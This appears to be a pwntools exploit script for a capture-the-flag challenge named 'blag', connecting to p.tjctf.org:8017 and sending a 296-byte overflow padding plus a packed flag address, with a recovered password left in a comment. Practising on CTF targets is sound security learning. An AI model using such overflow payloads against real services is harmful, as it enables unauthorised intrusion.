from pwn import *

context(log_level="debug")
flag_addr = 0x0804B080


# p = process('./blag')
p = remote('p.tjctf.org',8017)
# gdb.attach(p,'b*0x804892C\nc')
p.recvuntil('> ')
p.sendline('add')

p.recvuntil('\n')
p.sendline('1')
p.recvuntil('\n')
p.sendline('1')
p.recvuntil('\n')
p.sendline('a'*(324-28)+p32(flag_addr))
p.interactive()
#s00pers3cr3tpassw0rdy0